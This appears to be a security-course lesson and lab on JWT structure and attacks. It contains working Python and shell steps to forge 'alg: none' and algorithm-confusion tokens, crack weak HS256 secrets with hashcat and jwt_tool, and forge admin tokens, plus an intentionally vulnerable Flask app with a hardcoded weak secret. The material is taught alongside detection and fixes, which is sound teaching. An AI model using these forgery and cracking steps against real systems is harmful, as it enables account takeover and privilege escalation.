---
title: "JWT Structure and JWT Attack Lab"
tags: [foundation, auth, JWT, alg-none, algorithm-confusion, RS256, HS256,
       weak-secret, jwt_tool, token-forgery, lab]
module: 01-Foundation-05
day: 42
related_topics:
  - MFA and MFA Bypass (Day 041)
  - OAuth 2 Flow and OAuth Attacks (Day 043)
  - Auth Detection and Hardening (Day 047)
---

# Day 042 — JWT Structure and JWT Attack Lab

## Goals

By the end of this lesson and lab you will be able to:

1. Decode a JWT manually — no tools — and name each component.
2. Explain the `alg: none` attack and why it is still found in the wild.
3. Execute the RS256→HS256 algorithm confusion attack step-by-step.
4. Brute-force a weak JWT secret using hashcat and jwt_tool.
5. Forge a valid JWT that elevates privileges in a lab application.

---

## Prerequisites

- [Day 041 — MFA and MFA Bypass](DAY-0041-MFA-and-MFA-Bypass.md)
- [Day 022 — Burp Suite Setup, Proxy, Repeater](../01-Foundation-03/DAY-0022-Burp-Suite-Setup-Proxy-Repeater.md)
- [Day 024 — Burp Lab Episode 2](../01-Foundation-03/DAY-0024-Burp-Lab-Episode-2.md)

---

## Main Content — Part 1: JWT Anatomy

### 1. What a JWT Is

A JSON Web Token (JWT) is a compact, self-contained credential. The server
signs it at login; the client presents it on every subsequent request.
The server **does not need a session store** — it verifies the signature.

That statelessness is both the appeal and the attack surface.

**Structure:**

```
HEADER.PAYLOAD.SIGNATURE
```

All three parts are Base64URL-encoded (not standard Base64 — uses `-` and `_`
instead of `+` and `/`, and omits padding `=`).

---

### 2. Decoding a JWT by Hand

Take this token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Split on `.` → three parts.

**Part 1 — Header:**

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

**Part 2 — Payload:**

```bash
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9" \
  | base64 -d
# {"sub":"1234567890","name":"Alice","role":"user","iat":1700000000}
```

**Part 3 — Signature:**

The signature is `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)`.
Without the secret, you cannot verify or forge it. But you can read the claims.

**Standard claims:**

| Claim | Meaning |
|---|---|
| `sub` | Subject — usually the user ID |
| `iss` | Issuer — who signed it |
| `aud` | Audience — who it is for |
| `exp` | Expiry — Unix timestamp |
| `iat` | Issued at — Unix timestamp |
| `jti` | JWT ID — unique per token (enables revocation) |

---

## Main Content — Part 2: Attack 1 — `alg: none`

### 3. The `alg: none` Attack — CWE-347

**What it is:**
The JWT spec allows `"alg": "none"` to indicate an unsigned token.
If the server accepts it, an attacker can forge any claims with no signature.

**Why it works:**
Some libraries parse the algorithm from the token header and then branch:

```javascript
// Vulnerable pseudocode in early versions of node-jsonwebtoken:
if (decoded.header.alg === 'none') {
    // skip signature verification
    return decoded.payload;
}
```

The assumption was that `none` would only appear in internal contexts.
Attackers supply it in externally-sourced tokens.

**Minimal exploit:**

```python
import base64, json

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Original token claims — we want to change role to admin
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234567890", "name": "Alice", "role": "admin", "iat": 1700000000}

h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# No signature — just a trailing dot
forged = f"{h}.{p}."
print(forged)
```

**Real-world case:**
CVE-2015-9235 — `node-jsonwebtoken` < 4.2.2 accepted `alg: none`.
Auth0 disclosed it. Dozens of apps were vulnerable for years after the fix
because developers pinned old library versions.

**Detection:**
Log any JWT where the header contains `"alg":"none"`. That header value
has no legitimate use from client-supplied tokens.

**Fix:**
```javascript
// Explicitly whitelist allowed algorithms — never read alg from the token:
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

---

## Main Content — Part 3: Attack 2 — RS256→HS256 Algorithm Confusion

### 4. The Algorithm Confusion Attack — CVE-2016-10555 class

**What it is:**
When a server uses RS256 (asymmetric — signs with private key, verifies with
public key), an attacker who obtains the public key can trick a vulnerable
library into using the public key as the HS256 (HMAC) secret — and forge tokens.

**Why it works:**

RS256 verification logic:
```
verify(token, publicKey, algorithm=RS256)
```

Vulnerable library logic when algorithm is read from the token:
```
if header.alg == 'HS256':
    verify_hmac(token, key=publicKey, algorithm=HS256)
```

The attacker:
1. Obtains the server's RSA public key (often exposed at `/jwks.json` or
   `/.well-known/openid-configuration`).
2. Creates a token with `"alg": "HS256"`.
3. Signs it with `HMAC-SHA256(header.payload, public_key_pem_bytes)`.
4. Sends it. The server retrieves its public key, sees `alg=HS256`, and uses
   the public key as the HMAC secret → signature verifies.

**Step-by-step exploit:**

```python
import jwt, requests

# Step 1: Fetch the public key (many servers expose it)
resp = requests.get("http://target.lab/.well-known/jwks.json")
# Or directly: http://target.lab/public.pem

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Step 2: Forge a token using the public key as the HMAC secret
forged_payload = {
    "sub": "1",
    "name": "Alice",
    "role": "admin",
    "iat": 1700000000
}

# Sign using HS256 with the public key as secret
forged_token = jwt.encode(
    forged_payload,
    public_key,               # ← public key used as HMAC secret
    algorithm="HS256"
)

print(forged_token)
```

**With jwt_tool:**

```bash
# Install:
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool
pip3 install -r requirements.txt

# Perform algorithm confusion attack:
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
# -X k = key confusion attack
# -pk  = path to the public key
```

**Detection:**
Alert on any JWT where `alg` in the header is different from what your
server issues. If you issue RS256, any HS256 token is suspicious.

**Fix:**
Never read the `alg` from the token. Hardcode it server-side:

```python
# PyJWT — correct:
jwt.decode(token, public_key, algorithms=["RS256"])  # Whitelist, not "auto"

# Wrong — never do this:
alg = jwt.get_unverified_header(token)['alg']
jwt.decode(token, key, algorithms=[alg])  # Attacker controls alg!
```

---

## Main Content — Part 4: Attack 3 — Weak Secret Brute Force

### 5. Cracking a Weak HS256 Secret

If the JWT uses HS256 with a guessable secret (common config, dev leftovers,
short strings), you can crack it offline.

**With hashcat:**

```bash
# JWT tokens crack with hashcat mode 16500 (JWT)
# The "hash" is the full token
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ.SIGNATURE" \
  > jwt.txt

hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules:
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**With jwt_tool:**

```bash
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
# -C = crack mode
# -d = dictionary file
```

**After recovering the secret — forge the token:**

```python
import jwt

secret = "supersecret"  # Cracked

forged = jwt.encode(
    {"sub": "1", "role": "admin", "exp": 9999999999},
    secret,
    algorithm="HS256"
)
print(forged)
```

---

## Main Content — Part 5: Lab

### Lab Setup

```bash
# Vulnerable JWT app — Docker
docker run -d --name jwt-lab -p 5001:5001 \
  -e JWT_SECRET="secret123" \
  ticarpi/jwt-lab

# Or build a minimal one:
cat > /tmp/jwt_app.py << 'EOF'
from flask import Flask, request, jsonify
import jwt as pyjwt
import datetime

app = Flask(__name__)
SECRET = "secret123"   # Intentionally weak

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    if data.get('username') == 'alice' and data.get('password') == 'password':
        token = pyjwt.encode({
            'sub': '1',
            'username': 'alice',
            'role': 'user',
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
        }, SECRET, algorithm='HS256')
        return jsonify({'token': token})
    return jsonify({'error': 'invalid credentials'}), 401

@app.route('/admin')
def admin():
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer '):
        return jsonify({'error': 'missing token'}), 401
    token = auth[7:]
    try:
        payload = pyjwt.decode(token, SECRET, algorithms=['HS256'])
        if payload.get('role') != 'admin':
            return jsonify({'error': 'forbidden'}), 403
        return jsonify({'message': 'Welcome, admin!', 'flag': 'FLAG{jwt_secret_cracked}'})
    except pyjwt.InvalidTokenError as e:
        return jsonify({'error': str(e)}), 401

if __name__ == '__main__':
    app.run(port=5001)
EOF
python3 /tmp/jwt_app.py &
```

---

### Lab Task 1 — Decode Without Tools

1. Login and capture the JWT:

```bash
curl -s -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password"}'
```

2. Split the token on `.` and decode each part manually:

```bash
TOKEN="<paste_token_here>"
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null; echo
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null; echo
```

3. What algorithm is used? What claims are present? Can you read `role`?

---

### Lab Task 2 — Crack the Secret

```bash
echo "<FULL_TOKEN>" > /tmp/jwt.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt

# Or with jwt_tool:
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

Note the cracked secret.

---

### Lab Task 3 — Forge Admin Token

```python
import jwt, datetime

SECRET = "<cracked_secret>"

forged = jwt.encode({
    'sub': '1',
    'username': 'alice',
    'role': 'admin',          # Escalated
    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
}, SECRET, algorithm='HS256')

print(forged)
```

```bash
curl -s http://localhost:5001/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"
# Expected: {"message":"Welcome, admin!","flag":"FLAG{jwt_secret_cracked}"}
```

---

### Lab Task 4 — `alg: none` Attempt

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
payload = b64url(json.dumps({
    "sub": "1",
    "username": "alice",
    "role": "admin",
    "exp": 9999999999
}, separators=(',',':')).encode())

token_none = f"{header}.{payload}."
print(token_none)
```

```bash
curl -s http://localhost:5001/admin \
  -H "Authorization: Bearer <ALG_NONE_TOKEN>"
# Does the server accept it? (It should not — PyJWT rejects alg:none by default)
```

If the server rejects it: good — it is correctly configured.
If the server accepts it: find the exact library version and report it.

---

## Key Takeaways

1. **JWTs are readable by anyone.** Base64URL is encoding, not encryption.
   Never put secrets, PII, or sensitive data in a JWT payload unless it is
   encrypted (JWE — a separate spec).
2. **`alg: none` is a 10-year-old bug that still ships.** Explicitly whitelist
   allowed algorithms server-side. Never read `alg` from the token.
3. **Algorithm confusion is subtle and catastrophic.** An attacker with the
   public key can forge tokens if the library trusts the `alg` header.
   Always pass a fixed algorithm list to `jwt.verify()`.
4. **Weak secrets make HS256 worthless.** HMAC is only as strong as the secret.
   Use a CSPRNG-generated 256-bit secret. Rotate it on compromise.
5. **Statelessness is a revocation problem.** Once issued, a JWT cannot be
   revoked without a blocklist — which eliminates the statelessness advantage.
   Design accordingly: short `exp`, server-side jti blocklist for logout.

---

## Exercises

### Exercise 1 — jwt_tool Tamper Mode

With the lab running:
1. Capture the user JWT.
2. Use `jwt_tool.py <TOKEN> -T` (tamper mode) to modify `role` to `admin`
   without knowing the secret. Does the server accept the tampered token?
3. Explain why the answer is correct behaviour.

### Exercise 2 — Secure JWT Implementation

Write a Flask endpoint that:
- Issues JWT with `RS256` (generate a key pair with `openssl genrsa 2048`).
- Hardcodes `algorithms=['RS256']` in `jwt.decode()`.
- Sets `exp` to 15 minutes.
- Maintains a Redis `jti` blocklist checked on every request.
- Returns `403` (not `401`) on an expired token.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 041 — MFA and MFA Bypass](DAY-0041-MFA-and-MFA-Bypass.md)*
*Next: [Day 043 — OAuth 2 Flow and OAuth Attacks](DAY-0043-OAuth-2-Flow-and-OAuth-Attacks.md)*
